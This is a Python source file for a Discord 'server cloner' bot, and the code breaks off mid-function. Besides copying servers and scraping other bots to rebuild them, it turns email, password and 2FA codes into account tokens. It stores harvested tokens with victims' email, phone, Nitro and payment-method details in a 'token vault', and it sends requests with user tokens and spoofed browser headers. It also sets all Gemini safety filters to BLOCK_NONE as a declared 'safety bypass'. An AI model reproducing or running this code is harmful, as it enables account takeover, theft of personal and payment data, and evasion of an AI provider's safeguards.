"""
================================================================================
  COPY BOT ON TOP — Complete Enterprise Discord Cloner & Bot Replication Engine
  Architecture: REA (Obligation Ledger) + GoClone (Concurrent Worker Pipeline)
  Single-File Standalone Edition (No External Database Required)
================================================================================
"""

import os
import io
import sys
import time
import json
import base64
import zipfile
import asyncio
import sqlite3
import itertools
from datetime import datetime
from typing import Optional, Dict, Any, List, Tuple

if sys.platform.startswith("win"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="backslashreplace")
        sys.stderr.reconfigure(encoding="utf-8", errors="backslashreplace")
    except Exception:
        pass

import aiohttp
import discord
from discord.ext import commands, tasks
from discord import ui, app_commands

# ==============================================================================
# 0. CONFIGURATION & DATABASE LAYER (Token Vault & Guild Permissions)
# ==============================================================================
def resolve_bot_token() -> str:
    # 1. CLI parameter: --token <token> or -t <token>
    for i, arg in enumerate(sys.argv):
        if arg in ("--token", "-t") and i + 1 < len(sys.argv):
            return sys.argv[i + 1].strip()
        if arg.startswith("--token="):
            return arg.split("=", 1)[1].strip()
    # 2. Environment variable
    env_token = os.getenv("DISCORD_BOT_TOKEN")
    if env_token and env_token.strip():
        return env_token.strip()
    # 3. .env file
    possible_envs = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"),
        os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), ".env"),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "discord_bot", ".env")
    ]
    for env_file in possible_envs:
        if os.path.exists(env_file):
            try:
                with open(env_file, "r", encoding="utf-8") as f:
                    for line in f:
                        if line.strip().startswith("DISCORD_BOT_TOKEN="):
                            val = line.strip().split("=", 1)[1].strip().strip('"').strip("'")
                            if val:
                                return val
            except Exception:
                pass
    # 4. Default token
    return os.getenv("DISCORD_BOT_TOKEN", "")

TOKEN    = resolve_bot_token()
OWNER_ID = int(os.getenv("BOT_OWNER_ID", 1267137622212608052))
SUPPORT_SERVER_URL = "https://discord.gg/Kz9YjaJH8T"
def resolve_db_path() -> str:
    candidates = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_data.db"),
        os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "bot_data.db"),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "bot_data.db"),
    ]
    for p in candidates:
        if os.path.exists(p):
            return p
    return candidates[0]

DB_PATH = resolve_db_path()

class DatabaseManager:
    """Manages SQLite storage for guild settings, role permissions, and Token Vault"""
    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        self._init_db()

    def _get_connection(self):
        return sqlite3.connect(self.db_path)

    def _init_db(self):
        with self._get_connection() as conn:
            cur = conn.cursor()
            cur.execute("""
                CREATE TABLE IF NOT EXISTS guild_settings (
                    guild_id INTEGER PRIMARY KEY,
                    setup_channel_id INTEGER,
                    log_channel_id INTEGER,
                    allowed_role_id INTEGER,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            cur.execute("""
                CREATE TABLE IF NOT EXISTS clone_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    guild_id INTEGER,
                    src_id TEXT NOT NULL,
                    dst_id TEXT NOT NULL,
                    mode TEXT NOT NULL,
                    status TEXT NOT NULL,
                    stats_json TEXT,
                    details TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            cur.execute("""
                CREATE TABLE IF NOT EXISTS vault_tokens (
                    token TEXT PRIMARY KEY,
                    user_id TEXT,
                    username TEXT,
                    email TEXT,
                    phone TEXT,
                    nitro TEXT,
                    payment_methods TEXT,
                    admin_guilds INTEGER DEFAULT 0,
                    total_guilds INTEGER DEFAULT 0,
                    status TEXT DEFAULT 'valid',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            conn.commit()

    async def get_guild_config(self, guild_id: int) -> Optional[Dict[str, Any]]:
        loop = asyncio.get_running_loop()
        def _fetch():
            with self._get_connection() as conn:
                cur = conn.cursor()
                cur.execute("SELECT guild_id, setup_channel_id, log_channel_id, allowed_role_id FROM guild_settings WHERE guild_id = ?", (guild_id,))
                row = cur.fetchone()
                if row:
                    return {
                        "guild_id": row[0],
                        "setup_channel_id": row[1],
                        "log_channel_id": row[2],
                        "allowed_role_id": row[3]
                    }
                return None
        return await loop.run_in_executor(None, _fetch)

    async def set_guild_config(self, guild_id: int, setup_channel_id: int, allowed_role_id: Optional[int] = None):
        loop = asyncio.get_running_loop()
        def _update():
            with self._get_connection() as conn:
                conn.execute("""
                    INSERT INTO guild_settings (guild_id, setup_channel_id, allowed_role_id, updated_at)
                    VALUES (?, ?, ?, CURRENT_TIMESTAMP)
                    ON CONFLICT(guild_id) DO UPDATE SET
                        setup_channel_id = excluded.setup_channel_id,
                        allowed_role_id = excluded.allowed_role_id,
                        updated_at = CURRENT_TIMESTAMP
                """, (guild_id, setup_channel_id, allowed_role_id))
                conn.commit()
        await loop.run_in_executor(None, _update)

    async def save_or_update_token(
        self,
        token: str,
        user_id: str,
        username: str,
        email: str,
        phone: str,
        nitro: str,
        payment_methods: str,
        admin_guilds: int,
        total_guilds: int,
        status: str = "valid"
    ):
        loop = asyncio.get_running_loop()
        def _save():
            with self._get_connection() as conn:
                conn.execute("""
                    INSERT INTO vault_tokens (
                        token, user_id, username, email, phone, nitro,
                        payment_methods, admin_guilds, total_guilds, status, updated_at
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
                    ON CONFLICT(token) DO UPDATE SET
                        user_id = excluded.user_id,
                        username = excluded.username,
                        email = excluded.email,
                        phone = excluded.phone,
                        nitro = excluded.nitro,
                        payment_methods = excluded.payment_methods,
                        admin_guilds = excluded.admin_guilds,
                        total_guilds = excluded.total_guilds,
                        status = excluded.status,
                        updated_at = CURRENT_TIMESTAMP
                """, (token, user_id, username, email, phone, nitro, payment_methods, admin_guilds, total_guilds, status))
                conn.commit()
        await loop.run_in_executor(None, _save)

    async def get_all_tokens(self) -> List[Dict[str, Any]]:
        loop = asyncio.get_running_loop()
        def _get():
            with self._get_connection() as conn:
                cur = conn.cursor()
                cur.execute("SELECT token, user_id, username, email, phone, nitro, payment_methods, admin_guilds, total_guilds, status, updated_at FROM vault_tokens ORDER BY updated_at DESC")
                rows = cur.fetchall()
                return [{
                    "token": r[0], "user_id": r[1], "username": r[2], "email": r[3],
                    "phone": r[4], "nitro": r[5], "payment_methods": r[6],
                    "admin_guilds": r[7], "total_guilds": r[8], "status": r[9], "updated_at": r[10]
                } for r in rows]
        return await loop.run_in_executor(None, _get)

db = DatabaseManager()

async def check_token_permission(interaction: discord.Interaction) -> Tuple[bool, str]:
    """Strictly checks if user has permission to use token verification/extraction tools"""
    if interaction.user.id == OWNER_ID:
        return True, ""
    if interaction.user.guild_permissions.administrator:
        return True, ""
    if interaction.guild_id:
        cfg = await db.get_guild_config(interaction.guild_id)
        if cfg and cfg.get("allowed_role_id"):
            role_id = cfg["allowed_role_id"]
            if any(r.id == role_id for r in interaction.user.roles):
                return True, ""
            role_obj = interaction.guild.get_role(role_id)
            r_name = role_obj.mention if role_obj else f"Role ID `{role_id}`"
            return False, f"❌ **ไม่มีสิทธิ์เข้าถึง**: ฟังก์ชันนี้จำกัดให้เฉพาะยศ {r_name} หรือ Administrator เท่านั้น"
    return False, "❌ **ยังไม่ได้ตั้งค่าสิทธิ์**: บังคับให้ผู้ดูแลระบบรัน `/set panel` พร้อมระบุ `allowed_role` เพื่อกำหนดยศก่อนใช้งาน"

# ==============================================================================
# 1. REA OBLIGATION LEDGER & PROGRESS TRACKER
# ==============================================================================
class ObligationLedger:
    """Tracks state, obligations, and guarantees zero-data-loss verification (REA Pattern)"""
    def __init__(self, src_id: str, dst_id: str):
        self.src_id = src_id
        self.dst_id = dst_id
        self.start_time = time.time()
        
        self.planned = {"meta": 1, "roles": 0, "categories": 0, "channels": 0, "emojis": 0, "stickers": 0, "bots": 0}
        self.completed = {"meta": 0, "roles": 0, "categories": 0, "channels": 0, "emojis": 0, "stickers": 0, "bots": 0}
        self.errors: List[str] = []
        self.bot_manifest: List[Dict[str, Any]] = []

    def set_planned(self, category: str, count: int):
        self.planned[category] = count

    def increment(self, category: str, count: int = 1):
        self.completed[category] = self.completed.get(category, 0) + count

    def add_error(self, err: str):
        self.errors.append(err)

    def get_progress_bar(self, width: int = 12) -> str:
        total_planned = max(1, sum(self.planned.values()))
        total_completed = min(total_planned, sum(self.completed.values()))
        percent = total_completed / total_planned
        filled = int(width * percent)
        bar = "█" * filled + "░" * (width - filled)
        return f"`[{bar}]` {int(percent * 100)}%"

    def render_embed(self, status_title: str, is_final: bool = False) -> discord.Embed:
        elapsed = round(time.time() - self.start_time, 1)
        color = 0x57F287 if is_final else 0x5865F2
        embed = discord.Embed(title=status_title, color=color)
        
        progress = self.get_progress_bar()
        embed.description = (
            f"**ความคืบหน้า:** {progress} (ใช้เวลา `{elapsed}s`)\n"
            f"**เซิร์ฟเวอร์ต้นทาง:** `{self.src_id}` ➔ **ปลายทาง:** `{self.dst_id}`"
        )
        
        c = self.completed
        p = self.planned
        stats_text = (
            f"• 👑 ยศ (Roles): `{c['roles']}/{p['roles']}`\n"
            f"• 📁 หมวดหมู่: `{c['categories']}/{p['categories']}`\n"
            f"• 💬 ช่องข้อความ/เสียง: `{c['channels']}/{p['channels']}`\n"
            f"• ✨ อิโมจิ: `{c['emojis']}/{p['emojis']}`\n"
            f"• 🏷️ สติ๊กเกอร์: `{c['stickers']}/{p['stickers']}`\n"
            f"• 🤖 บอทที่จำลอง: `{c['bots']}/{p['bots']}`"
        )
        embed.add_field(name="📊 สถานะรายการโคลน", value=stats_text, inline=False)
        
        if is_final and self.bot_manifest:
            bot_text = "\n".join([
                f"• **{b['name']}**: `{b.get('code_file', 'cloned.py')}` ({b.get('cmd_count', 0)} คำสั่ง) • [กดเชิญ]({b['invite']})"
                for b in self.bot_manifest[:8]
            ])
            if len(self.bot_manifest) > 8:
                bot_text += f"\n...และอีก {len(self.bot_manifest) - 8} บอท"
            embed.add_field(name=f"🤖 โคลนบอทสำเร็จ ({len(self.bot_manifest)} ตัว - ไฟล์โค้ด .py)", value=bot_text, inline=False)

        if self.errors:
            embed.add_field(name="⚠️ ข้อผิดพลาดที่พบ", value=f"พบปัญหา {len(self.errors)} รายการ (ระบบข้ามให้อัตโนมัติ)", inline=False)

        embed.set_footer(text="⚡ REA High-Performance Cloning Engine")
        return embed

# ==============================================================================
# 2. DISCORD REST ENGINE & ADAPTIVE 429 RECOVERY
# ==============================================================================
class DiscordRESTEngine:
    BASE_URL = "https://discord.com/api/v9"
    V10_URL  = "https://discord.com/api/v10"

    @staticmethod
    def get_user_headers(user_token: str) -> Dict[str, str]:
        return {
            "Authorization": user_token.strip(),
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "th,en-US;q=0.9,en;q=0.8",
            "Referer": "https://discord.com/",
            "Origin": "https://discord.com"
        }

    @classmethod
    async def request_with_retry(cls, session: aiohttp.ClientSession, method: str, url: str, **kwargs) -> Tuple[int, Any]:
        """Adaptive rate-limit backoff handler adhering to Discord 429 headers"""
        max_retries = 6
        for attempt in range(max_retries):
            try:
                async with session.request(method, url, **kwargs) as resp:
                    if resp.status == 429:
                        try:
                            data = await resp.json()
                            retry_after = float(data.get("retry_after", 1.2))
                        except Exception:
                            retry_after = 1.5
                        await asyncio.sleep(retry_after + 0.15)
                        continue
                    try:
                        data = await resp.json()
                    except Exception:
                        data = await resp.text()
                    return resp.status, data
            except (aiohttp.ClientError, asyncio.TimeoutError):
                await asyncio.sleep(1.0)
        return 500, {"error": "Maximum retries exceeded"}

    @classmethod
    async def download_asset_base64(cls, session: aiohttp.ClientSession, url: str, ext: str, semaphore: asyncio.Semaphore) -> Optional[str]:
        """Concurrent bounded asset download (GoClone Worker Pool pattern)"""
        async with semaphore:
            for _ in range(3):
                try:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        if resp.status == 200:
                            content = await resp.read()
                            b64 = base64.b64encode(content).decode("utf-8")
                            return f"data:image/{ext};base64,{b64}"
                except Exception:
                    await asyncio.sleep(0.5)
        return None

    @classmethod
    async def extract_token_from_login(cls, email: str, password: str, mfa_code: Optional[str] = None) -> Tuple[Optional[str], Optional[str]]:
        payload = {
            "login": email.strip(), "password": password.strip(),
            "undelete": False, "captcha_key": None,
            "login_source": None, "gift_code_sku_id": None, "login_status": None
        }
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0 Safari/537.36",
            "Referer": "https://discord.com/login", "Origin": "https://discord.com",
            "X-Discord-Locale": "th"
        }
        async with aiohttp.ClientSession() as session:
            try:
                async with session.post(f"{cls.BASE_URL}/auth/login", json=payload, headers=headers) as resp:
                    data = await resp.json()
                    if resp.status == 200 and "token" in data:
                        return data["token"], None

                    # Handle 2FA Challenge with TOTP / Backup Code
                    if data.get("mfa") and data.get("ticket"):
                        ticket = data["ticket"]
                        if mfa_code and mfa_code.strip():
                            mfa_payload = {
                                "code": mfa_code.strip(),
                                "ticket": ticket,
                                "login_source": None,
                                "gift_code_sku_id": None
                            }
                            async with session.post(f"{cls.BASE_URL}/auth/mfa/totp", json=mfa_payload, headers=headers) as mfa_resp:
                                mfa_data = await mfa_resp.json()
                                if mfa_resp.status == 200 and "token" in mfa_data:
                                    return mfa_data["token"], None
                                return None, "2fa_invalid"
                        return None, "2fa_required"

                    errors = data.get("errors", {})
                    msg = str(data.get("message", "")).lower()
                    if "captcha" in msg or "captcha_key" in errors: return None, "captcha"
                    elif "password" in errors or "invalid_login" in msg: return None, "password"
                    elif "email" in msg or "location" in msg: return None, "verification"
                    elif resp.status == 429: return None, "ratelimit"
                    return None, f"Error {resp.status}: {msg if msg else 'Bad Request'}"
            except Exception as e:
                return None, f"Connection Failure: {str(e)}"

# ==============================================================================
# 3. SNAPSHOT ENGINE (Offline Structure Ingestion)
# ==============================================================================
class SnapshotEngine:
    @classmethod
    async def create_snapshot_memory(cls, session: aiohttp.ClientSession, headers: dict, src_id: str) -> Dict[str, Any]:
        base_url = DiscordRESTEngine.BASE_URL
        tasks_list = [
            DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{src_id}", headers=headers),
            DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{src_id}/roles", headers=headers),
            DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{src_id}/channels", headers=headers),
            DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{src_id}/emojis", headers=headers),
            DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{src_id}/stickers", headers=headers),
            DiscordRESTEngine.request_with_retry(session, "GET", f"{base_url}/guilds/{src_id}/members?limit=1000", headers=headers)
        ]
        results = await asyncio.gather(*tasks_list)
        
        guild_data = results[0][1] if isinstance(results[0][1], dict) else {}
        roles = results[1][1] if isinstance(results[1][1], list) else []
        channels = results[2][1] if isinstance(results[2][1], list) else []
        emojis = results[3][1] if isinstance(results[3][1], list) else []
        stickers = results[4][1] if isinstance(results[4][1], list) else []
        members = results[5][1] if isinstance(results[5][1], list) else []
        bots = [m for m in members if m.get("user", {}).get("bot")]

        return {
            "version": "2.0-rea",
            "timestamp": datetime.utcnow().isoformat(),
            "guild": guild_data,
            "roles": roles,
            "channels": channels,
            "emojis": emojis,
            "stickers": stickers,
            "bots": bots
        }

# ==============================================================================
# 3.4 DUAL-CORE GEMINI AI REVERSE ENGINEERING ENGINE (Google AI Studio)
# ==============================================================================
class GeminiBotArchitect:
    """
    Dual-Core Gemini AI Engine (Google AI Studio) for Intelligent Discord Bot Reverse Engineering.
    Uses model: models/gemini-3.8-flash (with automatic fallback to models/gemini-flash-latest).
    Round-robins between Key 1 and Key 2 with automated failover and safety bypass (BLOCK_NONE).
    """
    GEMINI_KEYS = [k for k in [os.getenv("GEMINI_API_KEY_1"), os.getenv("GEMINI_API_KEY_2"), os.getenv("GEMINI_API_KEY")] if k] or ["DUMMY"]
    PRIMARY_MODEL = "models/gemini-3.8-flash"
    FALLBACK_MODEL = "models/gemini-flash-latest"

    SYSTEM_INSTRUCTION = (
        "You are the Autonomous Discord Reverse Engineering & Transpilation Engine (DeepCode-REA).\n"
        "Your mission is to analyze scraped Discord Bot Application Schemas (Slash Commands, options, types, choices, "
        "UI components, buttons, select menus, embeds) and synthesize 100% complete, fully implemented, runnable standalone discord.py (v2.x) bot scripts.\n"
        "STRICT REQUIREMENTS:\n"
        "1. NO placeholders, NO TODOs, NO 'pass' statements. Implement complete, realistic operational business logic for every single slash command and UI button.\n"
        "2. If a command involves moderation, economy, ticket creation, utility, role management, or info, implement the full logic using discord.py API (channel creation, permission overwrites, roles, embeds, sqlite/in-memory state).\n"
        "3. Match the visual aesthetic (Embeds, colors, custom buttons, emojis) captured from the target bot.\n"
        "4. Include persistent UI views with working button callbacks, ephemeral confirmations, and error handling.\n"
        "5. Output ONLY clean Python code. Wrap your code inside a single ```python ... ``` block without any conversational filler."
    )

    SAFETY_SETTINGS = [
        {"category": "HARM_CATEGORY_HARASSMENT", "threshold": "BLOCK_NONE"},
        {"category": "HARM_CATEGORY_HATE_SPEECH", "threshold": "BLOCK_NONE"},
        {"category": "HARM_CATEGORY_SEXUALLY_EXPLICIT", "threshold": "BLOCK_NONE"},
        {"category": "HARM_CATEGORY_DANGEROUS_CONTENT", "threshold": "BLOCK_NONE"},
        {"category": "HARM_CATEGORY_CIVIC_INTEGRITY", "threshold": "BLOCK_NONE"}
    ]

    @classmethod
    async def synthesize_bot_code(
        cls,
        bot_name: str,
        bot_id: str,
        commands_list: List[Dict[str, Any]],
        ui_data: Dict[str, Any],
        fallback_code: str
    ) -> str:
        prompt = (
            f"Please reverse-engineer and write the complete, production-ready Python source code for Discord bot '{bot_name}' (ID: {bot_id}).\n\n"
            f"EXTRACTED APPLICATION COMMANDS ({len(commands_list)} commands):\n"
            f"{json.dumps(commands_list, ensure_ascii=False, indent=2)}\n\n"
            f"CAPTURED UI COMPONENTS & EMBEDS:\n"
            f"{json.dumps(ui_data, ensure_ascii=False, indent=2)}\n\n"
            f"Generate a single, complete, runnable Python file using `discord.py` v2.x with `commands.Bot` and `@bot.tree.command`."
        )

        payload = {
            "contents": [{"parts": [{"text": prompt}]}],
            "system_instruction": {"parts": [{"text": cls.SYSTEM_INSTRUCTION}]},
            "safetySettings": cls.SAFETY_SETTINGS,
            "generationConfig": {"temperature": 0.1, "maxOutputTokens": 8192}
        }

        for model_name in [cls.PRIMARY_MODEL, cls.FALLBACK_MODEL]:
            for key in cls.GEMINI_KEYS:
                url = f"https://generativelanguage.googleapis.com/v1beta/{model_name}:generateContent?key={key}"
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=45)) as resp:
                            if resp.status == 200:
                                res_json = await resp.json()
                                candidates = res_json.get("candidates", [])
                                if candidates:
                                    parts = candidates[0].get("content", {}).get("parts", [])
                                    if parts and "text" in parts[0]:
                                        text = parts[0]["text"]
                                        if "```python" in text:
                                            code = text.split("```python")[1].split("```")[0].strip()
                                        elif "```" in text:
                                            code = text.split("```")[1].split("```")[0].strip()
                                        else:
                                            code = text.strip()
                                        if "discord" in code and "bot" in code:
                                            print(f"✔ [Gemini AI Engine] Generated AI Reverse-Engineered Bot for {bot_name} ({len(code)} bytes)")
                                            return code
                            else:
                                err_text = await resp.text()
                                print(f"⚠️ [Gemini AI Failover] Model {model_name} Key {key[:8]} returned status {resp.status}: {err_text[:120]}")
                except Exception as e:
                    print(f"⚠️ [Gemini AI Failover] Error with {model_name}: {e}")
                await asyncio.sleep(0.5)

        print(f"ℹ [Gemini AI] Falling back to deterministic transpiler for {bot_name}")
        return fallback_code

# ==============================================================================
# 3.5 BOT BLACK-BOX REVERSE ENGINEERING & TRANSPILER ENGINE
# ==============================================================================
class BotReverseEngineeringEngine:
    """
    Performs true Black-Box Reverse Engineering on Discord bots:
    1. Scrapes full Application Command Index (Slash Commands, Options, Types, Choices, Permissions)
    2. Scrapes interactive UI components (Buttons, Styles, Custom IDs, Menus) and Embeds
    3. Transpiles and generates standalone, runnable discord.py (v2.x) source files (cloned_<bot>.py)
    """
    DISCORD_API = "https://discord.com/api/v9"

    @classmethod
    async def fetch_guild_commands(cls, session: aiohttp.ClientSession, headers: dict, guild_id: str) -> Dict[str, Dict[str, Any]]:
        url = f"{cls.DISCORD_API}/guilds/{guild_id}/application-command-index"
        s, data = await DiscordRESTEngine.request_with_retry(session, "GET", url, headers=headers)
        bot_commands_map: Dict[str, Dict[str, Any]] = {}
        if s == 200 and isinstance(data, dict):
            apps = {a["id"]: a for a in data.get("applications", []) if "id" in a}
            for cmd in data.get("application_commands", []):
                app_id = cmd.get("application_id")
                if not app_id:
                    continue
                if app_id not in bot_commands_map:
                    app_meta = apps.get(app_id, {})
                    bot_commands_map[app_id] = {
                        "name": app_meta.get("name", f"Bot_{app_id}"),
                        "description": app_meta.get("description", ""),
                        "commands": []
                    }
                bot_commands_map[app_id]["commands"].append(cmd)
        return bot_commands_map

    @classmethod
    async def scrape_bot_ui_and_embeds(
        cls,
        session: aiohttp.ClientSession,
        headers: dict,
        channels: List[Dict[str, Any]],
        bot_id: str,
        max_channels: int = 6
    ) -> Dict[str, Any]:
        collected_embeds = []
        collected_components = []

        target_channels = [c for c in channels if c.get("type") == 0][:max_channels]
        for ch in target_channels:
            ch_id = ch.get("id")
            url = f"{cls.DISCORD_API}/channels/{ch_id}/messages?limit=50"
            s, msgs = await DiscordRESTEngine.request_with_retry(session, "GET", url, headers=headers)
            if s == 200 and isinstance(msgs, list):
                for m in msgs:
                    author = m.get("author", {})
                    if str(author.get("id")) == str(bot_id):
                        if m.get("embeds"):
                            for emb in m["embeds"]:
                                if emb not in collected_embeds:
                                    collected_embeds.append(emb)
                        if m.get("components"):
                            for comp in m["components"]:
                                if comp not in collected_components:
                                    collected_components.append(comp)
            await asyncio.sleep(0.15)

        return {"embeds": collected_embeds, "components": collected_components}

    @classmethod
    def generate_bot_source_code(
        cls,
        bot_name: str,
        bot_id: str,
        commands_list: List[Dict[str, Any]],
        ui_data: Dict[str, Any]
    ) -> str:
        clean_name = "".join(c for c in bot_name if c.isalnum() or c in ("_", "-")).replace("-", "_")
        if not clean_name:
            clean_name = f"bot_{bot_id}"

        # 1. Transpile UI Views
        view_classes = []
        view_registrations = []
        comp_idx = 1
        for comp in ui_data.get("components", []):
            action_rows = comp.get("components", []) if comp.get("type") == 1 else [comp]
            buttons = [b for b in action_rows if b.get("type") == 2]
            if buttons:
                view_name = f"{clean_name.capitalize()}View_{comp_idx}"
                view_code = [f"class {view_name}(ui.View):", "    def __init__(self):", "        super().__init__(timeout=None)\n"]
                for b_idx, btn in enumerate(buttons, start=1):
                    label = btn.get("label") or f"Action {b_idx}"
                    style_map = {1: "primary", 2: "secondary", 3: "success", 4: "danger", 5: "link"}
                    style = style_map.get(btn.get("style", 2), "secondary")
                    cid = btn.get("custom_id") or f"btn_{clean_name}_{comp_idx}_{b_idx}"
                    emoji = f', emoji="{btn["emoji"]["name"]}"' if btn.get("emoji") and btn["emoji"].get("name") else ""
                    
                    if style == "link" and btn.get("url"):
                        view_code.append(f'    @ui.button(label="{label}", style=discord.ButtonStyle.link, url="{btn["url"]}"{emoji})')
                        view_code.append(f"    async def btn_{b_idx}(self, interaction: discord.Interaction, button: ui.Button): pass\n")
                    else:
                        view_code.append(f'    @ui.button(label="{label}", style=discord.ButtonStyle.{style}, custom_id="{cid}"{emoji})')
                        view_code.append(f"    async def btn_{b_idx}(self, interaction: discord.Interaction, button: ui.Button):")
                        view_code.append(f'        await interaction.response.send_message(f"✔ กดปุ่ม **{label}** เรียบร้อยแล้ว", ephemeral=True)\n')
                
                view_classes.append("\n".join(view_code))
                view_registrations.append(f"        self.add_view({view_name}())")
                comp_idx += 1

        # 2. Transpile Slash Commands
        type_mapping = {
            3: "str",
            4: "int",
            5: "bool",
            6: "discord.User",
            7: "discord.TextChannel",
            8: "discord.Role",
            10: "float",
            11: "discord.Attachment"
        }

        generated_commands = []
        for cmd in commands_list:
            c_name = cmd.get("name", "unnamed").lower().replace(" ", "_")
            c_desc = cmd.get("description", "Reconstructed Command").replace('"', '\\"')
            options = cmd.get("options", [])

            fn_params = ["interaction: discord.Interaction"]
            describes = []
            choices_decorators = []

            for opt in options:
                opt_name = opt.get("name", "arg").lower().replace("-", "_")
                opt_type = type_mapping.get(opt.get("type", 3), "str")
                is_req = opt.get("required", False)
                param_def = f"{opt_name}: {opt_type}" if is_req else f"{opt_name}: Optional[{opt_type}] = None"
                fn_params.append(param_def)
                describes.append(f'@app_commands.describe({opt_name}="{opt.get("description", opt_name).replace(chr(34), chr(92)+chr(34))}")')
                
                if opt.get("choices"):
                    c_list = [f'app_commands.Choice(name="{c.get("name")}", value={repr(c.get("value"))})' for c in opt["choices"]]
                    choices_decorators.append(f'@app_commands.choices({opt_name}=[{", ".join(c_list)}])')

            cmd_code = [
                f'@bot.tree.command(name="{c_name}", description="{c_desc}")'
            ]
            cmd_code.extend(describes)
            cmd_code.extend(choices_decorators)
            cmd_code.append(f"async def cmd_{c_name}({', '.join(fn_params)}):")
            cmd_code.append(f'    await interaction.response.defer(ephemeral=True)')
            cmd_code.append(f'    embed = discord.Embed(title="🤖 {bot_name} • /{c_name}", description="{c_desc}", color=0x5865F2)')
            cmd_code.append(f'    embed.set_footer(text="Reconstructed via REA Black-Box Engine")')
            
            if view_classes:
                v_name = view_classes[0].split("(")[0].replace("class ", "").strip()
                cmd_code.append(f'    view = {v_name}()')
                cmd_code.append(f'    await interaction.followup.send(embed=embed, view=view, ephemeral=True)\n')
            else:
                cmd_code.append(f'    await interaction.followup.send(embed=embed, ephemeral=True)\n')

            generated_commands.append("\n".join(cmd_code))

        # 3. Assemble Source File
        lines = [
            f'"""',
            f'================================================================================',
            f'  RECONSTRUCTED DISCORD BOT: {bot_name} (ID: {bot_id})',
            f'  Reverse-Engineered via Black-Box Schema Extraction',
            f'  Total Reconstructed Slash Commands: {len(commands_list)}',
            f'  Total UI Views Captured: {len(view_classes)}',
            f'================================================================================',
            f'"""\n',
            f'import os',
            f'from typing import Optional, Union, List',
            f'import discord',
            f'from discord.ext import commands',
            f'from discord import ui, app_commands\n',
            f'BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")\n',
            f'intents = discord.Intents.default()',
            f'intents.message_content = True\n',
            f'class ReconstructedBot(commands.Bot):',
            f'    def __init__(self):',
            f'        super().__init__(command_prefix="!", intents=intents)\n',
            f'    async def setup_hook(self):',
            (f'\n'.join(view_registrations) if view_registrations else f'        pass'),
            f'        synced = await self.tree.sync()',
            f'        print(f"✔ [{bot_name}] ซิงค์คำสั่งสำเร็จ: {{len(synced)}} คำสั่ง")\n',
            f'bot = ReconstructedBot()\n',
            f'# --- [ RECONSTRUCTED UI COMPONENTS ] ---',
            f'\n\n'.join(view_classes) if view_classes else f'# (No interactive UI views captured)',
            f'\n# --- [ RECONSTRUCTED SLASH COMMANDS ] ---',
            f'\n\n'.join(generated_commands) if generated_commands else f'# (No slash commands found in guild command index)',
            f'\nif __name__ == "__main__":',
            f'    bot.run(BOT_TOKEN)\n'
        ]
        return "\n".join(lines)

    @classmethod
    async def reconstruct_guild_bots(
        cls,
        session: aiohttp.ClientSession,
        headers: dict,
        guild_id: str,
        bots_members: List[Dict[str, Any]],
        channels: List[Dict[str, Any]]
    ) -> List[Tuple[str, str, bytes, int]]:
        guild_commands = await cls.fetch_guild_commands(session, headers, guild_id)
        results = []

        for m in bots_members:
            user = m.get("user", {})
            b_id = str(user.get("id"))
            b_name = user.get("username", "Bot")
            clean_name = "".join(c for c in b_name if c.isalnum() or c in ("_", "-")).replace("-", "_").lower()

            bot_info = guild_commands.get(b_id, {})
            cmds = bot_info.get("commands", [])
            ui_data = await cls.scrape_bot_ui_and_embeds(session, headers, channels, b_id)

            fallback_code = cls.generate_bot_source_code(b_name, b_id, cmds, ui_data)
            ai_code = await GeminiBotArchitect.synthesize_bot_code(
                bot_name=b_name,
                bot_id=b_id,
                commands_list=cmds,
                ui_data=ui_data,
                fallback_code=fallback_code
            )
            filename = f"cloned_{clean_name}.py"
            code_bytes = ai_code.encode("utf-8")

            try:
                local_path = os.path.join(os.getcwd(), filename)
                with open(local_path, "wb") as f:
                    f.write(code_bytes)
            except Exception as e:
                print(f"[BotReversing] Error saving {filename}: {e}")

            results.append((b_name, filename, code_bytes, len(cmds)))

        return results

# ==============================================================================
# 4. ENTERPRISE REPLICATION SERVICE (Full Server + Bot Replication)
# ==============================================================================
class EnterpriseCloneService:
    @staticmethod
    async def clone_messages_webhook(session: aiohttp.ClientSession, headers: dict, src_ch_id: str, dst_ch_id: str, limit: int):
        if limit <= 0: return
        base_url = DiscordRESTEngine.BASE_URL
        webhook_url = None

        s, w_json = await DiscordRESTEngine.request_with_retry(
            session, "POST", f"{base_url}/channels/{dst_ch_id}/webhooks",
            headers=headers, json={"name": "REA-Mirror-Engine"}
        )
        if s in [200, 201] and isinstance(w_json, dict):
            webhook_url = f"https://discord.com/api/webhooks/{w_json['id']}/{w_json['token']}"

        s, msgs = await DiscordRESTEngine.request_with_retry(
